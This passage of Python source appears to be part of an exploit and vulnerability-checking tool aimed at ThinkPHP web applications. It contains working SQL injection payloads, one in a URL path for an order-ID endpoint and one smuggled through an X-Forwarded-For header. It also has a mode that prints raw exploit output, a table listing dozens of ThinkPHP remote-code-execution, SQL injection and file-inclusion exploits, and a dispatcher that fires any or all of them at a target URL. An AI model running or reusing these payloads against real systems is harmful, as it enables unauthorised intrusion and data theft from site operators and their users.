                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"11111" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def tp_pay_orderid_sqli(self):
        appName = 'thinkphp'
        pocname = 'tp_pay_orderid_sqli'
        path = '/index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"56540676a129760a" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))


    def tp_view_recent_xff_sqli(self):
        appName = 'thinkphp'
        pocname = 'tp_view_recent_xff_sqli'
        path = '/index.php?s=/home/article/view_recent/name/1'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'X-Forwarded-For': "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"56540676a129760a" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Impact Version && Vulnerability description']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
tb.add_row([
    "ThinkPHP3",
    "tp3_select_find_delete_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP3",
    "tp3_cache_file",
    "[file]"
])
tb.add_row([
    "ThinkPHP3",
    "tp3_order_by_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP3",
    "tp3_update_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_1",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_2",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_3",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_4",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_5",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_6",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_debug_rce",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_debug_index_ids_sqli",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_driver_display_rce",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_invoke_func_code_exec_1",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_invoke_func_code_exec_2",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_invoke_func_code_exec_3",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_method_filter_code_exec",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_request_input_rce",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_templalte_driver_rce",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_query_max_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_Builder_parseData_insert_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_Builder_parseData_orderby_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_Mysql_parseWhereItem_select_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_1",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_cache_include_file",
    "[rce]"
])
tb.add_row([
    "ThinkPHP?",
    "tp_cache",
    "[file]"
])
tb.add_row([
    "ThinkPHP?",
    "tp_pay_orderid_sqli",
    "[sql]"
])
tb.add_row([
    "ThinkPHP?",
    "tp_view_recent_xff_sqli",
    "[sql]"
])
print('eg: http://192.168.243.133/thinkphp_5.0.15/public/')
print(tb)

def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpThinkPHP = ThinkPHP(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpThinkPHP, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpThinkPHP.status
    else:#调用所有函数
        for func in dir(ThinkPHP):
            if not func.startswith("__"):
                methodcaller(func)(ExpThinkPHP)
                result_list.append(func+' -> '+ExpThinkPHP.status)
                ExpThinkPHP.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)



























